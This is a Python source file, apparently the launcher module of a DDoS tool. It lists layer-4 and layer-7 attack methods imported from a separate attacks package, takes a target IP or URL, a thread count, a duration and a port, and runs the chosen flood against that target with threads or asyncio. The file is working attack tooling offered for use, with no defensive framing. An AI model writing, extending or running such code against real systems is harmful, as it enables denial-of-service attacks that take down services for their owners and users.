import asyncio
import threading

from .attacks import layer4, layer7


def run_ddos_attack(config=None):
    L4_CLASSES = layer4.L4_CLASSES
    L7_CLASSES = layer7.L7_CLASSES
    ALL_METHODS = list(L4_CLASSES.keys()) + list(L7_CLASSES.keys())

    if config:
        method = config.get("method")
        target = config.get("target")
        threads = config.get("threads")
        duration = config.get("duration")
        port = config.get("port")
    else:
        # Fallback to console input if no config is provided
        print("Available DDoS Attack Methods:")
        col_width = max(len(m) for m in ALL_METHODS) + 4
        for i in range(0, len(ALL_METHODS), 4):
            print("".join(
                f"[{i+j+1:02d}] {ALL_METHODS[i+j]:<{col_width}}" for j in range(4) if i+j < len(ALL_METHODS)))

        method = input("Enter attack method: ").strip().upper()
        target = input("Enter target IP or URL: ")
        threads = int(input("Enter number of threads: "))
        duration = int(input("Enter duration in seconds: "))
        port = int(input("Enter target port (if L4): ")
                   ) if method in L4_CLASSES else None

    if method not in ALL_METHODS:
        print("Invalid method selected.")
        return

    print(
        f"Starting {method} attack on {target} for {duration} seconds with {threads} threads.")

    attack_instance = None
    try:
        if method in L4_CLASSES:
            attack_class = L4_CLASSES[method]
            attack_type = method
            attack_instance = attack_class(target, port, duration, attack_type)

            attack_thread = threading.Thread(
                target=attack_instance.run, args=(threads,))
            attack_thread.start()
            attack_thread.join(duration)
            if attack_thread.is_alive():
                attack_instance.stop()
                attack_thread.join()

        elif method in L7_CLASSES:
            attack_class = L7_CLASSES[method]
            attack_type = method
            attack_instance = attack_class(target, duration, attack_type)
            asyncio.run(attack_instance.run(threads))

    except Exception as e:
        print(f"Attack failed: {e}")

    print("Attack finished.")
